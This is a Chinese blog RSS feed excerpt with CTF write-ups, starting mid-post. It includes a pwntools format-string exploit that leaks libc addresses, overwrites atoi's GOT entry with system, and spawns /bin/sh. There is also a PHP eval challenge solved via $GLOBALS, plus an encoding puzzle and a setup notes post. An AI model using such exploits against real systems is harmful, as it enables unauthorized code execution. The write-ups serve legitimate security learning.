<p>夸张的是，%x能泄露栈上高地址位的内容，%n的修改内存的功能，能将更改任意函数的调用。这两者结合简直无法无天。</p>
<p>下面进入题目分析环节。。。：
IDA pro分析：
<img src="/img/pwn/24.jpg" alt="figure">
这道题了里，我们先利用%$7x(取第7个四字节数)， 返回puts函数链接后的地址。然后用%n改变atoi的调用，使它的调用地址指向system的函数地址（用偏移量算）,输入的age没经过类型检查，直接换成&quot;/bin/sh&quot;, 大功告成。
exp:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;pwne&#39;</span><span class="p">)</span>
<span class="c1"># conn=remote(&#39;ip&#39;,port)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;/lib/i386-linux-gnu/libc.so.6&#39;</span><span class="p">)</span>
<span class="c1">#libc=ELF(&#39;./libc.so.6&#39;)</span>
<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./pwne&#39;</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;[Y/N]</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;Y&#39;</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;NAME:</span><span class="se">\n\n</span><span class="s1">&#39;</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">p32</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">])</span> <span class="o">+</span> <span class="s1">&#39;%7$s&#39;</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;WELCOME </span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
<span class="n">puts_addr</span><span class="o">=</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">()[</span><span class="mi">4</span><span class="p">:</span><span class="mi">8</span><span class="p">]</span>
<span class="c1"># print u32(put_addr)</span>
<span class="n">system_addr</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span> <span class="o">+</span> <span class="n">u32</span><span class="p">(</span><span class="n">puts_addr</span><span class="p">)</span>
<span class="n">atoi_got_addr</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;atoi&#39;</span><span class="p">]</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;17&#39;</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;[Y/N]</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;Y&#39;</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;NAME:</span><span class="se">\n\n</span><span class="s1">&#39;</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">fmtstr_payload</span><span class="p">(</span><span class="mi">7</span><span class="p">,</span> <span class="p">{</span><span class="n">atoi_got_addr</span><span class="p">:</span> <span class="n">system_addr</span><span class="p">}))</span>
<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;GET YOUR AGE:</span><span class="se">\n\n</span><span class="s1">&#39;</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;/bin/sh</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div><p>效果如下：
<img src="/img/pwn/25.jpg" alt="figure"></p>
]]></content>
		</item>
		
		<item>
			<title>pwntools下踩的坑</title>
			<link>https://shankisme.com/posts/pwntools%E4%B8%8B%E8%B8%A9%E7%9A%84%E5%9D%91/</link>
			<pubDate>Tue, 25 Feb 2020 19:03:01 +0800</pubDate>
			
			<guid>https://shankisme.com/posts/pwntools%E4%B8%8B%E8%B8%A9%E7%9A%84%E5%9D%91/</guid>
			<description>纯pwn小白在疫情期间无聊，于是开始玩起了pwn。期间在i春秋,freebuf，知乎上随便看了几篇入门手册，难受的是技术活什么都看不懂。。距离上次接触汇编是大一下学期吧，当时计算机系统的实践课程要求做某常青藤的bomblab,当时跟着大佬的步骤勉强完成三关。探索的过程很累，尤其是在汇编知识还没消化完，就去做ret2somefunc的题，一个字：难，两个字：难顶。
废话不多说，下面记录配pwntools环境踩的坑。当然踩坑还是因为没有先好好读官方文档。
0x00 介绍 pwntools(v2.0)是编写漏洞利用脚本的python库，设计者将它分为两个模块：pwnlib与pwn。 pwnlib是个干净的模块，适合初学者快速入门。而pwn是打CTF专用的工具箱，是pwnlib的超集，功能更多，也更难入门。具体介绍请看pwntools文档。
0x01 pwntools不适配windows中的python。 我先尝试在windows环境下pip install pwn。很快就装好了，本以为直接运行python脚本就大功告成了，结果编译器告诉我：
行吧，缺东西，咱用pip补上，但是发现_curses仅支持linux，巧的是在win平台上有对应轮子。然后还是会有问题，就开始无限打补丁。。当然最后脑子没抽到底，换到了linux内,这里推荐ubuntu linux 64。
0x02 要想方便流畅写exp，最好装在python2内。 为什么？因为从python3开始，str和bytes的边界不再模糊。python2中 str+bytes能合并成bytes，默认将str以ascii编码解码，而python3中，除非加法重定向，否则无法合并成统一格式。所以在python3中要想合并str和bytes。只能str.encode(&#39;ascii&#39;)+bytes或者str.encode+bytes.decode(&#39;ascii&#39;)
0x03 pwntools不适合装在32位系统中 该坑是我在ubuntu 32安装pwntools遇到的，执行exp会有警告，pwntools仍然会起作用，但是具体会产生什么影响我也不清楚，因为当时还在写最简单的exp, 栈溢出攻击，ret2shellcode攻击。
另外，pwntools真的是非常好的工具，接口很齐全，谁用谁知道。
完。</description>
			<content type="html"><![CDATA[<p>纯pwn小白在疫情期间无聊，于是开始玩起了pwn。期间在i春秋,freebuf，知乎上随便看了几篇入门手册，难受的是技术活什么都看不懂。。距离上次接触汇编是大一下学期吧，当时计算机系统的实践课程要求做某常青藤的bomblab,当时跟着大佬的步骤勉强完成三关。探索的过程很累，尤其是在汇编知识还没消化完，就去做ret2somefunc的题，一个字：难，两个字：难顶。</p>
<p>废话不多说，下面记录配pwntools环境踩的坑。当然踩坑还是因为没有先好好读官方文档。</p>
<h2 id="0x00-介绍">0x00 介绍</h2>
<p>pwntools(v2.0)是编写漏洞利用脚本的python库，设计者将它分为两个模块：pwnlib与pwn。 pwnlib是个干净的模块，适合初学者快速入门。而pwn是打CTF专用的工具箱，是pwnlib的超集，功能更多，也更难入门。具体介绍请看<a href="http://docs.pwntools.com/en/stable/about.html">pwntools文档</a>。</p>
<h2 id="0x01">0x01</h2>
<p><strong>pwntools不适配windows中的python</strong>。
我先尝试在windows环境下pip install pwn。很快就装好了，本以为直接运行python脚本就大功告成了，结果编译器告诉我：</p>
<p><img src="/img/pwntools%E4%B8%8B%E8%B8%A9%E7%9A%84%E5%9D%91/1.JPG" alt="figure1">
行吧，缺东西，咱用pip补上，但是发现_curses仅支持linux，巧的是在win平台上有对应轮子。然后还是会有问题，就开始无限打补丁。。当然最后脑子没抽到底，换到了<strong>linux</strong>内,这里推荐ubuntu linux 64。</p>
<h2 id="0x02">0x02</h2>
<p><strong>要想方便流畅写exp，最好装在python2内</strong>。
为什么？因为从python3开始，str和bytes的边界不再模糊。python2中 str+bytes能合并成bytes，默认将str以ascii编码解码，而python3中，除非加法重定向，否则无法合并成统一格式。所以在python3中要想合并str和bytes。只能<code>str.encode('ascii')+bytes</code>或者<code>str.encode+bytes.decode('ascii')</code></p>
<h2 id="0x03">0x03</h2>
<p><strong>pwntools不适合装在32位系统中</strong>
该坑是我在ubuntu 32安装pwntools遇到的，执行exp会有警告，pwntools仍然会起作用，但是具体会产生什么影响我也不清楚，因为当时还在写最简单的exp, 栈溢出攻击，ret2shellcode攻击。</p>
<p>另外，pwntools真的是非常好的工具，接口很齐全，谁用谁知道。</p>
<p>完。</p>
]]></content>
		</item>
		
		<item>
			<title>ctf水题---传感器</title>
			<link>https://shankisme.com/posts/%E4%BC%A0%E6%84%9F%E5%99%A8/</link>
			<pubDate>Fri, 21 Feb 2020 01:07:00 +0800</pubDate>
			
			<guid>https://shankisme.com/posts/%E4%BC%A0%E6%84%9F%E5%99%A8/</guid>
			<description>本着入门的想法，在writeup的帮助下，试做人生中第一道CTF赛题, 本文目的是还原脱离wp的写题思路。
题目出自 i春秋CTF大本营: 2017届全国大学生信息安全竞赛
已知 A传感器的ID和它的输出， 以及B的输出。 求另一个传感器B的ID。
大致思路是从输出中寻找输出和ID的联系，而A的ID和输出就是线索。
发现输出是16进制，遇到进制问题首先做的肯定是比对进制转换后的数字。
先用在线工具转换一下A的输出 发现最有规律的是2进制和8进制数据 但是考虑到8进制不常用，并且它的规律集中在52上，没法利用 所以接下来看2进制： 2进制数据除了前5个1，后面的数据都以二进制对01，10的形式在做排列组合 我们需要的是有规律的数， 所以可以舍弃掉输出中的前两位(3E , 5个1包含在其中) 继续观察余下的二进制数 发现很像数字逻辑中的电平跳变，0代表低位，1代表高位 该二进制数据可能是在传输数据。但是没有连续的0和1，因此该数据很有可能经过编码 查找各编码形式后发现只有曼切斯特编码和差分曼切斯特编码符合这个规律
曼切斯特编码： data用跳变表示，0和1对应01和10 至于谁对应谁有两种标准： 差分曼切斯特编码： 数字信号对应电平跳变，存在初始电平跳变cc=01, 当前的信号为0意味着当前跳变和上一个跳变相同，为1意味着当前跳变和前一个跳变不同。 知识回顾的差不多了，回到题目，开始撸代码 由于涉及到各种进制转换和划分，c++和java过于反人类，啥都要自己写，不如用python,python很多内嵌方法就能进行进制转换和划分了。 思路很简单 直接贴代码：
import re def bintohex(s1): s = re.findall(&amp;#39;.{4}&amp;#39;, s1) s2 = &amp;#39;&amp;#39; for i in s: s2 += str(hex(int(i, 2))).replace(&amp;#39;0x&amp;#39;,&amp;#39;&amp;#39;) return s2 def diffmqst(s1): #差分曼切斯特 pre = &amp;#39;01&amp;#39; rst = &amp;#39;&amp;#39; s = re.findall(&amp;#39;.{2}&amp;#39;,s1) for i in s: if i==pre: rst += &amp;#39;0&amp;#39; else : rst+=&amp;#39;1&amp;#39; pre = i return rst if __name__ == &amp;#39;__main__&amp;#39;: hex1 = &amp;#39;AAAAA56A69AA55A95995A569AA95565556&amp;#39; hex2 = &amp;#39;0x8893CA58&amp;#39; bin1 = bin(int(hex1, 16)).</description>
			<content type="html"><![CDATA[<p>本着入门的想法，在writeup的帮助下，试做人生中第一道CTF赛题, 本文目的是还原脱离wp的写题思路。</p>
<p><img src="/img/sensor/1.jpg" alt="传感器1">
题目出自 <a href="https://www.ichunqiu.com/battalion?t=1&amp;r=58837">i春秋CTF大本营: 2017届全国大学生信息安全竞赛</a></p>
<p>已知 A传感器的ID和它的输出， 以及B的输出。
求另一个传感器B的ID。</p>
<p>大致思路是从输出中寻找输出和ID的联系，而A的ID和输出就是线索。</p>
<p>发现输出是16进制，遇到进制问题首先做的肯定是比对进制转换后的数字。</p>
<p>先用在线工具转换一下A的输出
<img src="/img/sensor/2.jpg" alt="传感器1"></p>
<p>发现最有规律的是2进制和8进制数据
但是考虑到8进制不常用，并且它的规律集中在52上，没法利用
所以接下来看2进制：
2进制数据除了前5个1，后面的数据都以二进制对01，10的形式在做排列组合
我们需要的是有规律的数，
所以可以舍弃掉输出中的前两位(3E , 5个1包含在其中)
继续观察余下的二进制数
发现很像数字逻辑中的电平跳变，0代表低位，1代表高位
该二进制数据可能是在传输数据。但是没有连续的0和1，因此该数据很有可能经过编码
查找各编码形式后发现只有曼切斯特编码和差分曼切斯特编码符合这个规律</p>
<h2 id="曼切斯特编码">曼切斯特编码：</h2>
<p>data用跳变表示，0和1对应01和10
至于谁对应谁有两种标准：
<img src="/img/sensor/3.png" alt="传感器1"></p>
<h2 id="差分曼切斯特编码">差分曼切斯特编码：</h2>
<p>数字信号对应电平跳变，存在初始电平跳变cc=01, 当前的信号为0意味着当前跳变和上一个跳变相同，为1意味着当前跳变和前一个跳变不同。
<img src="/img/sensor/4.jpg" alt="传感器1"></p>
<p>知识回顾的差不多了，回到题目，开始撸代码
由于涉及到各种进制转换和划分，c++和java过于反人类，啥都要自己写，不如用python,python很多内嵌方法就能进行进制转换和划分了。
思路很简单 直接贴代码：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">re</span>
<span class="k">def</span> <span class="nf">bintohex</span><span class="p">(</span><span class="n">s1</span><span class="p">):</span>
    <span class="n">s</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="s1">&#39;.</span><span class="si">{4}</span><span class="s1">&#39;</span><span class="p">,</span> <span class="n">s1</span><span class="p">)</span>
    <span class="n">s2</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">s</span><span class="p">:</span>
        <span class="n">s2</span> <span class="o">+=</span> <span class="nb">str</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="mi">2</span><span class="p">)))</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;0x&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">s2</span>

<span class="k">def</span> <span class="nf">diffmqst</span><span class="p">(</span><span class="n">s1</span><span class="p">):</span> <span class="c1">#差分曼切斯特</span>
    <span class="n">pre</span> <span class="o">=</span> <span class="s1">&#39;01&#39;</span>
    <span class="n">rst</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
    <span class="n">s</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="s1">&#39;.</span><span class="si">{2}</span><span class="s1">&#39;</span><span class="p">,</span><span class="n">s1</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">s</span><span class="p">:</span>
        <span class="k">if</span> <span class="n">i</span><span class="o">==</span><span class="n">pre</span><span class="p">:</span>
            <span class="n">rst</span> <span class="o">+=</span> <span class="s1">&#39;0&#39;</span>
        <span class="k">else</span> <span class="p">:</span> <span class="n">rst</span><span class="o">+=</span><span class="s1">&#39;1&#39;</span>
        <span class="n">pre</span> <span class="o">=</span> <span class="n">i</span>
    <span class="k">return</span> <span class="n">rst</span>

<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
    <span class="n">hex1</span> <span class="o">=</span> <span class="s1">&#39;AAAAA56A69AA55A95995A569AA95565556&#39;</span>
    <span class="n">hex2</span> <span class="o">=</span> <span class="s1">&#39;0x8893CA58&#39;</span>
    <span class="n">bin1</span> <span class="o">=</span> <span class="nb">bin</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">hex1</span><span class="p">,</span> <span class="mi">16</span><span class="p">))</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;0b&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>
    <span class="n">bin2</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="s1">&#39;.</span><span class="si">{4}</span><span class="s1">&#39;</span><span class="p">,</span> <span class="nb">bin</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">hex1</span><span class="p">,</span> <span class="mi">16</span><span class="p">))</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;0b&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">))</span>
    <span class="n">dict1</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;0101&#39;</span><span class="p">:</span> <span class="s1">&#39;11&#39;</span><span class="p">,</span> <span class="s1">&#39;1010&#39;</span><span class="p">:</span><span class="s1">&#39;00&#39;</span><span class="p">,</span> <span class="s1">&#39;1001&#39;</span><span class="p">:</span><span class="s1">&#39;01&#39;</span><span class="p">,</span> <span class="s1">&#39;0110&#39;</span><span class="p">:</span> <span class="s1">&#39;10&#39;</span><span class="p">}</span> <span class="c1">#曼切斯特编码1 Thomas</span>
    <span class="n">dict2</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;0101&#39;</span><span class="p">:</span> <span class="s1">&#39;00&#39;</span><span class="p">,</span> <span class="s1">&#39;1010&#39;</span><span class="p">:</span><span class="s1">&#39;11&#39;</span><span class="p">,</span> <span class="s1">&#39;1001&#39;</span><span class="p">:</span><span class="s1">&#39;10&#39;</span><span class="p">,</span> <span class="s1">&#39;0110&#39;</span><span class="p">:</span> <span class="s1">&#39;01&#39;</span><span class="p">}</span> <span class="c1">#曼切斯特编码2 IEEE802.3</span>
    <span class="n">m1</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">dict1</span><span class="p">[</span><span class="n">_</span><span class="p">]</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="n">bin2</span><span class="p">)</span>
    <span class="n">m2</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">dict2</span><span class="p">[</span><span class="n">_</span><span class="p">]</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="n">bin2</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;曼切斯特编码1 id1: &#34;</span><span class="p">,</span> <span class="n">bintohex</span><span class="p">(</span><span class="n">m1</span><span class="p">))</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;曼切斯特编码2 id2: &#34;</span><span class="p">,</span> <span class="n">bintohex</span><span class="p">(</span><span class="n">m2</span><span class="p">))</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;差分曼切斯特编码 id3: &#34;</span><span class="p">,</span> <span class="n">bintohex</span><span class="p">(</span><span class="n">diffmqst</span><span class="p">(</span><span class="n">bin1</span><span class="p">)))</span>

</code></pre></div><p>输出：</p>
<pre tabindex="0"><code>曼切斯特编码1 id1:  003890f1d73907efe
曼切斯特编码2 id2:  ffc76f0e28c6f8101
差分曼切斯特编码 id3:  8024d8893ca584181
</code></pre><p>发现差分曼切斯特中包含传感器A的ID
沿这个思路， 不难找到传感器B的ID</p>
<p>flag=8845abf3</p>
]]></content>
		</item>
		
		<item>
			<title>ctf水题---爆破</title>
			<link>https://shankisme.com/posts/%E7%88%86%E7%A0%B4/</link>
			<pubDate>Fri, 21 Feb 2020 01:07:00 +0800</pubDate>
			
			<guid>https://shankisme.com/posts/%E7%88%86%E7%A0%B4/</guid>
			<description>实践证明，提示也有不可靠的时候，出题人也会鸡贼。 爆破一题目地址 这道题有时间限制，必须在一小时内完成，否则页面会失效，说白了是为了杜绝签到题互相抄袭hhh。 进去后给的是php后端源码。
这是本菜鸡第一次接触拍黄片php, 会了几招后发现php的语法简直像是C+python的私生子，带基因缺陷的那种。它很多函数方法都能轻易地获得文件地所有信息，还有大堆地全局变量魔术变量，配上eval()方法地缺陷，简直是爆破对象的上上之选啊。。 废话不多说，来看看代码：
&amp;lt;?php include &amp;#34;flag.php&amp;#34;; $a = @$_REQUEST[&amp;#39;hello&amp;#39;]; if(!preg_match(&amp;#39;/^\w*$/&amp;#39;,$a )){ die(&amp;#39;ERROR&amp;#39;); } eval(&amp;#34;var_dump($$a);&amp;#34;); show_source(__FILE__); ?&amp;gt;@$_REQUEST[&amp;lsquo;hello&amp;rsquo;] 提示我们上传的变量名为hello
request是两种数据上传方式post和get的统称 这里当然选更方便的get, 直接在url后加hello变量 下面的判断语句中的正则提示我们变量必须为[A-Za-z0-9_] 以及$$a告诉咱$a的值不能乱输，值要符合变量命名规则：开头字母下划线，之后只能字母下划线或数字。 继续往下看, 就发现神圣的选择开始了：
1：利用var_dump()输出变量内容，前提是得知道有个变量名是输入的值。其实不可能给你猜的，这种情况下只能全局变量或魔术变量。保险起见，选个超集：$GLOABALS
2: 类似sql注入，绕开var_dump()直接执行命令，这要求咱输入的命令包括“flag.php”，但是正则不允许吖，该思路失败。 最后按照1思路，直接把include&amp;quot;flag.php&amp;quot;后的全局变量全打印出来了。 发现flag在一个六位的全局变量里。
做到这里再看提示，说真的，应该只有高手和做完的人能推出其中意思，我这样的菜鸡很有可能去猜文件里的六位变量值。
后面陆续把爆破二，爆破三做掉了（偷偷参考了下WP 嘿嘿）
总结的话就是：web题解决的关键的熟悉php以及理解php的脆弱方面；2 php是直接上最好的语言（狗头）</description>
			<content type="html"><![CDATA[<p><img src="/img/bomb/t.JPG" alt="爆破1-3">
实践证明，提示也有不可靠的时候，出题人也会鸡贼。
<a href="https://www.ichunqiu.com/battalion">爆破一题目地址</a>
这道题有时间限制，必须在一小时内完成，否则页面会失效，说白了是为了杜绝签到题互相抄袭hhh。
进去后给的是php后端源码。</p>
<p>这是本菜鸡第一次接触<!-- raw HTML omitted -->拍黄片<!-- raw HTML omitted --> php, 会了几招后发现php的语法简直像是C+python的私生子，带基因缺陷的那种。它很多函数方法都能轻易地获得文件地所有信息，还有大堆地全局变量魔术变量，配上eval()方法地缺陷，简直是爆破对象的上上之选啊。。
废话不多说，来看看代码：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="k">include</span> <span class="s2">&#34;flag.php&#34;</span><span class="p">;</span>
<span class="nv">$a</span> <span class="o">=</span> <span class="o">@</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">&#39;hello&#39;</span><span class="p">];</span>
<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/^\w*$/&#39;</span><span class="p">,</span><span class="nv">$a</span> <span class="p">)){</span>
  <span class="k">die</span><span class="p">(</span><span class="s1">&#39;ERROR&#39;</span><span class="p">);</span>
<span class="p">}</span>
<span class="k">eval</span><span class="p">(</span><span class="s2">&#34;var_dump($</span><span class="si">$a</span><span class="s2">);&#34;</span><span class="p">);</span>
<span class="nx">show_source</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
<span class="cp">?&gt;</span><span class="err">
</span></code></pre></div><p>@$_REQUEST[&lsquo;hello&rsquo;] 提示我们上传的变量名为hello</p>
<p>request是两种数据上传方式post和get的统称
这里当然选更方便的get, 直接在url后加hello变量
下面的判断语句中的正则提示我们变量必须为[A-Za-z0-9_]
以及$$a告诉咱$a的值不能乱输，值要符合变量命名规则：开头字母下划线，之后只能字母下划线或数字。
继续往下看, 就发现神圣的选择开始了：</p>
<p>1：利用var_dump()输出变量内容，前提是得知道有个变量名是输入的值。其实不可能给你猜的，这种情况下只能全局变量或魔术变量。保险起见，选个超集：$GLOABALS</p>
<p>2: 类似sql注入，绕开var_dump()直接执行命令，这要求咱输入的命令包括“flag.php”，但是正则不允许吖，该思路失败。
最后按照1思路，直接把include&quot;flag.php&quot;后的全局变量全打印出来了。
发现flag在一个六位的全局变量里。</p>
<p>做到这里再看提示，说真的，应该只有高手和做完的人能推出其中意思，我这样的菜鸡很有可能去猜文件里的六位变量值。</p>
<p>后面陆续把爆破二，爆破三做掉了（偷偷参考了下WP 嘿嘿）</p>
<p>总结的话就是：web题解决的关键的熟悉php以及理解php的脆弱方面；2 php是直接上最好的语言（狗头）</p>
]]></content>
		</item>
		
	</channel>
</rss>
